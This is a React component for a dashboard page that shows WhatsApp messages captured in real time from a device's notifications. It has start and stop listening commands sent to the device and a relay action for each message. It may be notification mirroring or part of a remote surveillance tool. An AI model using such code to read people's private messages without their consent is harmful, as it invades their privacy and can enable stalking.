import React from 'react';
import { useDashboard } from '../context/DashboardContext';

export default function WhatsAppPage() {
  const { filteredWhatsapp, openRelayComposer, sendCommand } = useDashboard();

  return (
    <div className="glass-panel">
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
        <div>
          <h3 style={{ fontSize: '18px', fontWeight: '700' }}>WhatsApp Notification Feed</h3>
          <p style={{ color: 'var(--color-text-muted)', fontSize: '13px' }}>Reads chat messages from status bar notifications in real-time.</p>
        </div>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button className="btn btn-primary" onClick={() => sendCommand('WHATSAPP_START')}>
            Start Listening
          </button>
          <button className="btn btn-outline" onClick={() => sendCommand('WHATSAPP_STOP')}>
            Stop Listening
          </button>
        </div>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
        {filteredWhatsapp.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '40px', color: 'var(--color-text-muted)' }}>
            No WhatsApp notification logs captured yet
          </div>
        ) : (
          filteredWhatsapp.map((notif, index) => (
            <div
              key={index}
              className="glass-panel"
              style={{
                padding: '16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '6px',
                borderLeft: '4px solid var(--accent-emerald)',
                background: 'rgba(255, 255, 255, 0.01)',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontWeight: '800', color: 'var(--accent-emerald)', fontSize: '15px' }}>
                  {notif.title}
                </span>
                <span style={{ fontSize: '11px', color: 'var(--color-text-darker)' }}>
                  {new Date(notif.date).toLocaleString()}
                </span>
              </div>
              <p style={{ fontSize: '14px', color: 'var(--color-text-main)', marginTop: '4px' }}>
                {notif.text}
              </p>
              <div style={{ marginTop: '6px' }}>
                <button
                  className="btn btn-outline"
                  style={{ padding: '8px 12px' }}
                  onClick={() => openRelayComposer('whatsapp', notif)}
                >
                  Open Relay Page
                </button>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  );
}
